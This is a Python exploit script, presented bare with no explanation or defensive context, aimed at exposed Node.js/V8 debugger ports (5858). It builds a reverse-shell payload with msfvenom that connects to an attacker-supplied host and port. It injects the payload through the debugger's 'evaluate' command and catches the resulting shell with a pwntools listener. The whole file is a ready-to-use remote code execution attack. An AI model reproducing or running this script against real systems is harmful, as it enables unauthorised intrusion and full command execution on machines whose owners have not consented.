import socket
import json
import sys
import subprocess
from pwn import *
import threading
chost = sys.argv[2]
cport = sys.argv[3]
log.warning("Generating NODEJS payload")
def exploit(target, chost, cport):
 payload = subprocess.Popen(["msfvenom", "-p", 'nodejs/shell_reverse_tcp', 'LHOST='+chost, 'LPORT='+cport, '-f', 'raw'], stdout=subprocess.PIPE).communicate()[0]
 msg_body = {'seq':'1',
	     'type':'request',
	     'command':'evaluate',
             'arguments':{'expression':payload,
                           'global':True,
                           'maxStringLength':-1
                          }
            }
 msg_body = json.dumps(msg_body, ensure_ascii=False)
 msg_body_len = len(msg_body)
 msg_header = "Content-Length: {}\r\n\r\n".format(msg_body_len)
 msg_send = msg_header + msg_body
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((sys.argv[1], 5858))
 banner = s.recv(1024)
 if "V8-Version" in banner:
  log.success("Got handshake!")
 print banner
 log.info("Sending {} bytes".format(len(msg_send)))
 s.send(msg_send)
 reply = s.recv(1024)
 log.success("got reply")
 print reply
def shell(target, chost, cport):
 thread = threading.Thread(target=exploit, args=(target, chost, cport))
 thread.daemon = True
 thread.start()
 l = listen(int(cport))
 l.wait_for_connection()
 l.interactive(pwnlib.term.init())
shell(sys.argv[1], chost, cport)
